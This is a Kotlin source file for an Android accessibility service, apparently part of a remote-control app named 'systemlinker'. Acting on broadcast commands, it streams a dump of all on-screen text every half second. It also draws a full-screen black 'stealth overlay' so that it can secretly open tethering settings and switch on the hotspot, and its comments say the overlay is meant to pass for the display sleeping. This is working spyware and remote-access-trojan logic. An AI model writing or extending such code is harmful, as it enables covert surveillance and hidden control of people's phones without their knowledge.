package com.systemlinker.features

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import org.json.JSONArray
import org.json.JSONObject

class SystemAccessibility : AccessibilityService() {

    private var isStreamingScreen = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    private var isAutomatingHotspot = false
    
    // Stealth Overlay Variables
    private var windowManager: WindowManager? = null
    private var stealthOverlayView: View? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.getStringExtra("action")) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> isStreamingScreen = true
                "stream_screen_stop" -> isStreamingScreen = false
                "toggle_hotspot" -> {
                    isAutomatingHotspot = true
                    
                    // 1. Immediately cast the pitch-black stealth overlay
                    showStealthOverlay()
                    
                    // 2. FAILSAFE: Force close settings AND remove overlay after 3 seconds
                    mainHandler.postDelayed({
                        if (isAutomatingHotspot) {
                            isAutomatingHotspot = false
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            hideStealthOverlay()
                        }
                    }, 3000)
                    
                    // 3. Launch the settings app under the black screen
                    try {
                        val settingsIntent = Intent().apply {
                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(settingsIntent)
                    } catch (e: Exception) {
                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(fallbackIntent)
                    }
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val filter = IntentFilter("com.systemlinker.ACC_ACTION")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    // =====================================
    // STEALTH OVERLAY GENERATOR
    // =====================================
    private fun showStealthOverlay() {
        mainHandler.post {
            if (stealthOverlayView != null) return@post
            
            val layout = FrameLayout(this)
            // A pitch black screen looks like the display briefly slept or lagged
            layout.setBackgroundColor(Color.BLACK) 
            
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, // Magic bypass for Draw Over Apps
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or       // Lets underlying app keep window focus
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or       // Passes physical touches down
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,      // Covers status bar and nav bar
                PixelFormat.TRANSLUCENT
            )
            
            try {
                windowManager?.addView(layout, params)
                stealthOverlayView = layout
            } catch (e: Exception) { }
        }
    }

    private fun hideStealthOverlay() {
        mainHandler.post {
            stealthOverlayView?.let { 
                try {
                    windowManager?.removeView(it)
                } catch (e: Exception) { }
            }
            stealthOverlayView = null
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // --- 1. HOTSPOT AUTOMATION LOGIC ---
        if (isAutomatingHotspot) {
            val rootNode = rootInActiveWindow ?: return
            
            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
            var clicked = false

            for (keyword in keywords) {
                if (findAndClickSwitchForText(rootNode, keyword)) {
                    clicked = true
                    break
                }
            }

            if (clicked) {
                isAutomatingHotspot = false
                Thread.sleep(300) // Let the UI register the toggle
                performGlobalAction(GLOBAL_ACTION_BACK)
                
                // Automation finished, lift the black screen!
                hideStealthOverlay()
            }
            
            rootNode.recycle()
            return 
        }

        // --- 2. SCREEN STREAMING LOGIC ---
        if (!isStreamingScreen) return
        
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val rootNode = rootInActiveWindow ?: return
        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply {
            put("type", "live_screen")
            put("data", screenData)
        }
        
        val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
            setPackage(applicationContext.packageName)
            putExtra("json", jsonPayload.toString())
        }
        sendBroadcast(broadcast)
    }

    private fun findAndClickSwitchForText(rootNode: AccessibilityNodeInfo, text: String): Boolean {
        // Strategy 1: Tree Climbing (Structural Search)
        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
        if (!nodes.isNullOrEmpty()) {
            for (node in nodes) {
                var currentParent = node.parent
                var depth = 0
                while (currentParent != null && depth < 4) {
                    val switchNode = searchForSwitchInTree(currentParent)
                    if (switchNode != null && switchNode.isClickable) {
                        if (switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                    } else if (switchNode != null && currentParent.isClickable) {
                        if (currentParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                    }
                    currentParent = currentParent.parent
                    depth++
                }
                
                val clickable = findClickableParent(node)
                if (clickable != null && clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }
        }

        // Strategy 2: Sequential Linear Lookahead (User's Algorithm)
        val state = SearchState()
        if (dfsSequentialSearch(rootNode, text, state)) {
            return true
        }

        return false
    }

    private class SearchState(var recentMatch: Boolean = false, var steps: Int = 0)

    private fun dfsSequentialSearch(node: AccessibilityNodeInfo?, targetText: String, state: SearchState): Boolean {
        if (node == null) return false

        val nodeText = node.text?.toString() ?: ""
        
        if (nodeText.contains(targetText, ignoreCase = true)) {
            state.recentMatch = true
            state.steps = 0
        } else if (state.recentMatch) {
            state.steps++
        }

        if (state.recentMatch && state.steps <= 6) {
            val cName = node.className?.toString() ?: ""
            if (cName.contains("Switch") || node.isCheckable) {
                if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                val p = node.parent
                if (p != null && p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val clicked = dfsSequentialSearch(child, targetText, state)
            child?.recycle() 
            if (clicked) return true
        }
        return false
    }

    private fun searchForSwitchInTree(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        val className = node.className?.toString() ?: ""
        if (className.contains("Switch") || node.isCheckable) return node
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val found = searchForSwitchInTree(child)
            if (found != null) return found
        }
        return null
    }

    private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        var currentNode = node
        while (currentNode != null) {
            if (currentNode.isClickable) return currentNode
            val parent = currentNode.parent
            if (currentNode != node) currentNode.recycle()
            currentNode = parent
        }
        return null
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.put(dumpNode(child))
                child.recycle()
            }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }

    override fun onInterrupt() {
        hideStealthOverlay()
    }

    override fun onDestroy() {
        super.onDestroy()
        hideStealthOverlay()
        unregisterReceiver(commandReceiver)
    }
}